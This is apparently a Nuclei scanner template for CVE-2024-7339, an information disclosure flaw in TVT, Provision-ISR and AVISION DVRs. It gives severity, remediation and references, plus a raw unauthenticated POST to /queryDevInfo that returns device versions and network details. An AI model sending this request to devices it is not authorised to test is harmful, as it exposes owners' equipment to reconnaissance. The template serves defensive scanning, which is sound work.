id: CVE-2024-7339

info:
  name: Sensitive Device Information Disclosure in TVT DVR
  author: Stuxctf
  severity: medium
  description: |
    A vulnerability has been found in TVT DVR TD-2104TS-CL, DVR TD-2108TS-HP, Provision-ISR DVR SH-4050A5-5L(MM) and AVISION DVR AV108T and classified as problematic. This vulnerability affects unknown code of the file /queryDevInfo. The manipulation leads to information disclosure.
  impact: |
    An attacker get detailed device information including hardware and software versions, serial numbers, and network configuration.
  remediation: |
    Implement strict access controls and authentication mechanisms to manage access to the device interfaces.
  reference:
    - https://netsecfish.notion.site/Sensitive-Device-Information-Disclosure-in-TVT-DVR-fad1cce703d946969be5130bf3aaac0d
    - https://netsecfish.notion.site/Sensitive-Device-Information-Disclosure-in-TVT-DVR-fad1cce703d946969be5130bf3aaac0d?pvs=4
    - https://vuldb.com/?ctiid.273262
    - https://vuldb.com/?id.273262
    - https://vuldb.com/?submit.379373
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2024-7339
    cwe-id: CWE-200
    epss-score: 0.00045
    epss-percentile: 0.15505

http:
  - raw:
      - |
        POST /queryDevInfo HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Upgrade-Insecure-Requests: 1
        Connection: keep-alive
        User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS like Mac OS X) AppleWebKit (KHTML, like Gecko) Version Mobile Safari
        Content-Length: 103

        <?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "softwareVersion"
          - "eth0"